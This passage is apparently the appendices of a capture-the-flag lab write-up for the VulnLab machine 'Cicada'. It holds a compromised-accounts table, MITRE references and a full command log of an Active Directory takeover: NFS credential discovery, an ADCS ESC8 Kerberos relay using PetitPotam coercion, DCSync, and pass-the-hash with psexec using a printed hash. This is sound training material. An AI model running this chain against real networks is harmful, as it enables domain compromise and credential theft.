| Username          | Method                                            | Notes                                              |
| ----------------- | ------------------------------------------------- | -------------------------------------------------- |
| `Rosie.Powell`    | Plaintext password (`Cicada123`) in NFS image file | Initial domain foothold; used for relay attack      |
| `dc-jpq225$`      | Kerberos relay to ADCS; Certipy PKINIT auth       | Machine account; used for DCSync                   |
| `Administrator`   | DCSync (secretsdump) — NT hash extracted          | Full domain Administrator; pass-the-hash via psexec |

### D. Command Reference Log

```
# Reconnaissance
sudo nmap 10.129.234.48 -p- -sC -sV
echo "10.129.234.48 DC-JPQ225.cicada.vl" | sudo tee -a /etc/hosts

# NFS Enumeration
showmount -e DC-JPQ225.cicada.vl
mkdir target-nfs
sudo mount -t nfs DC-JPQ225.cicada.vl:/ ./target-nfs/ -o nolock
cd target-nfs/
tree .

# Image Inspection
sudo chmod 644 marketing.png
eog marketing.png

# Kerberos Auth & SMB
ntpdate -u cicada.vl
crackmapexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p 'Cicada123' -k
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p 'Cicada123' -k --shares

# ADCS Enumeration
certipy find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p Cicada123 -k -vulnerable -stdout

# Kerberos Relay Attack
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl \
  add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.188
certipy relay -target 'http://dc-jpq255.cicada.vl/' -template DomainController
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k \
  -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam

# Certificate Auth & Hash Extraction
certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48

# DCSync
KRB5CCNAME=dc-jpq225.ccache secretsdump.py -k -no-pass \
  cicada.vl/dc-jpq225$@dc-jpq225.cicada.vl -just-dc-user administrator

# Administrator Shell
impacket-psexec cicada.vl/administrator@DC-JPQ225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87

# Flags
type c:\Users\Administrator\Desktop\user.txt
type c:\Users\Administrator\Desktop\root.txt
```

### E. References

- [MITRE ATT&CK: T1552.001 — Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK: T1135 — Network Share Discovery](https://attack.mitre.org/techniques/T1135/)
- [MITRE ATT&CK: T1649 — Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)
- [MITRE ATT&CK: T1003.006 — OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)
- [SpecterOps: Certified Pre-Owned — ESC8 (ADCS HTTP Web Enrollment)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Synacktiv: Relaying Kerberos over SMB using KrbRelayX](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html)
- [Certipy by ly4k — ADCS Enumeration and Exploitation](https://github.com/ly4k/Certipy)
- [bloodyAD — Active Directory manipulation toolkit](https://github.com/CravateRouge/bloodyAD)
- [VulnLab Machine Page — Cicada](https://www.vulnlab.com)

> **Note on CVEs:** No specific CVEs apply to the findings in this report. The vulnerabilities identified are Active Directory and ADCS misconfigurations (overly permissive NFS export, ESC8 HTTP web enrollment, unsecured credential storage) rather than exploits against specific versioned software vulnerabilities. ESC8 is a known ADCS misconfiguration class documented in the SpecterOps "Certified Pre-Owned" research; it does not carry a CVE because it is a configuration issue rather than a software defect.
